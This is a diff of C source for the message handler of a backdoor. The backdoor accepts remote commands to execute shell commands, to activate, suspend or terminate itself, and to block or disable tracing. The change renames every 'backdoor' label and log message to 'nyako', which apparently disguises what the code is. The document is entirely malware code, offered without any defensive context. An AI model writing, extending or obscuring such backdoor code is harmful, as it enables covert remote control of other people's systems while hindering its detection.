@@ -97,8 +97,8 @@ static void handle_message(struct message_details *message_details)
 
   parse_message(message_details->message, &message);
 
-  // do not handle message if the backdoor is not active
-  if (active != true && message.type != TYPE_INVOKE_BACKDOOR)
+  // do not handle message if the nyako is not active
+  if (!active && (message.type != TYPE_INVOKE && message.type != TYPE_TERMINATE))
     return;
 
   if (message.type == TYPE_EXECUTE_CMD)
@@ -160,16 +160,21 @@ static void handle_message(struct message_details *message_details)
 
     pclose(cmd);
   }
-  else if (message.type == TYPE_INVOKE_BACKDOOR)
+  else if (message.type == TYPE_INVOKE)
   {
     active = true;
-    log_info("backdoor invoked");
+    log_info("nyako invoked");
   }
-  else if (message.type == TYPE_SUSPEND_BACKDOOR)
+  else if (message.type == TYPE_SUSPEND)
   {
     disable_no_trace();
     active = false;
-    log_info("backdoor suspended");
+    log_info("nyako suspended");
+  }
+  else if (message.type == TYPE_TERMINATE)
+  {
+    log_info("terminating nyako...");
+    cleanup();
   }
   else if (message.type == TYPE_BLOCK_TRACE)
   {
